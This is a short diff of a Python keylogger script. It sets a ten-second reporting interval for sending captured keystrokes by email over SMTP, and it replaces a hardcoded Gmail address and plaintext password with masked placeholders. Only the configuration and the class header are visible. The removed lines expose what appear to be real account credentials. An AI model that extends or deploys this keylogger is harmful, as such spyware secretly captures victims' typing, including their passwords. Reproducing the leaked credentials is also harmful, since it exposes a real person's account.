@@ -3,8 +3,8 @@ import smtplib
 from threading import Semaphore, Timer
 
 send_report_every=10 #seconds
-email_addr="yuvasyuvarajan@gmail.com"
-email_password="yr84963051999"
+email_addr="y*************@gmail.com"
+email_password="password"
 
 class keylogger():
      def __init__(self,interval):
